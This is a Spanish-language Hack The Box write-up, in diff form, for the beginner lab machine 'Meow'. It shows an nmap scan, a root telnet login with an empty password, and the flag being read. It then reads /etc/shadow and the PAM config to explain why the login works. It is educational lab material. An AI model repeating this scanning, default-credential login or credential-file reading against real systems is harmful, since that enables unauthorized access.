@@ -1,0 +1,121 @@
+---
+type: writeup
+title: Meow
+description: Máquina Linux que guía a los jugadores en la configuración de sus máquinas de ataque, la conexión a los laboratorios HTB mediante VPN y demuestra la estrategia para completarlas. La máquina se centra en técnicas de enumeración y muestra la explotación de un servicio Telnet vulnerable mediante credenciales predeterminadas.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/meow/meow.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Meow
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos todos los puertos buscando cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.190.222
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+23/tcp open  telnet  syn-ack ttl 63
+```
+
+Escaneamos el puerto abierto para ver más detalles sobre el servicio que está corriendo en él.
+
+```bash
+nmap -p 23 -sCV -oA nmap/openports 10.129.190.222
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+No me des tanta información a ver si no se por donde empezar. Listo, nos conectamos al servicio para ver que onda.
+
+```bash
+telnet 10.129.190.222
+```
+
+```plaintext
+Trying 10.129.190.222...
+Connected to 10.129.190.222.
+Escape character is '^]'.
+
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+
+Meow login: 
+Password: 
+```
+
+Nos pide usuario y contraseña que vaya a saber quien tiene esa data y de donde la sacamos.
+
+## Exploitation
+
+Como debe ser nos conectamos con el usuario `root` para ver si de casualidad no le pasamos contraseña pasa algo como obtener una shell.
+
+```bash
+telnet 10.129.190.222
+```
+
+Obtenemos una shell como el usuario `root` y como solo nos interesa la flag con el comando `ls` vemos si está en el directorio actual.
+
+```bash
+ls
+```
+
+```plaintext
+flag.txt  snap
+```
+
+Resultó que sí, está.
+
+```bash
+cat flag.txt 
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+b******************************9
+</Callout>
+
+## Configuración del servidor
+
+```bash
+sudo cat /etc/shadow
+```
+
+```plaintext
+root::18785:0:99999:7:::
+<SNIP>
+```
+
+El segundo campo (hash de la contraseña) está vacío.
+
+`root` es el primer campo, lo que va en medio de ambos dos puntos es el segundo campo `::`.
+
+`/etc/pam.d/common-auth` es un archivo de configuración de autenticación común a todos los servicios.
+
+```bash
+cat /etc/pam.d/common-auth
+```
+
+```plaintext
+<SNIP>
+# here are the per-package modules (the "Primary" block)
+auth	[success=1 default=ignore]	pam_unix.so nullok
+<SNIP>
+```
+
+`nullok` permite autenticar usuarios cuya contraseña esté vacía.
